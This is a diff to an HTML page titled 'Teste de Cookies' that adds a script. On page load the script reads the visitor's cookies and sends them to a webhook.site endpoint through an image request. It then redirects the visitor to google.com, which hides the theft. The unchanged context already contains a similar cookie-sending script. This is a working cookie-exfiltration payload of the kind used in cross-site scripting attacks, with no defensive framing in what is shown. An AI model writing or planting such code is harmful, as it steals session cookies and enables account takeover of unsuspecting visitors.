@@ -4,6 +4,12 @@
     <title>Teste de Cookies</title>
 </head>
 <body>
+	<script>
+        var cookies = document.cookie;
+        var i = new Image();
+        i.src = "https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?cookies=" + encodeURIComponent(cookies);
+	window.location.href = "https://www.google.com";
+    </script>
     <script>
         var i = new Image();
         i.src = "https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?cookie=" + document.cookie;
